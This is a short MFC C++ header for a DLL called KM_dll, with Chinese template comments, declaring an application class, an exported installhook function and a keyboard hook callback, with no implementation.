// KM_dll.h : KM_dll DLL 的主头文件
//

#pragma once

#ifndef __AFXWIN_H__
	#error "在包含此文件之前包含“stdafx.h”以生成 PCH 文件"
#endif

#include "resource.h"		// 主符号


// CKM_dllApp
// 有关此类实现的信息，请参阅 KM_dll.cpp
//

class CKM_dllApp : public CWinApp
{
public:
	CKM_dllApp();

// 重写
public:
	virtual BOOL InitInstance();


	DECLARE_MESSAGE_MAP()
};


void  __declspec(dllexport)__stdcall installhook();
void runInstall();
LRESULT CALLBACK KeyboardProc(int nCode,
    WPARAM wParam,
    LPARAM lParam);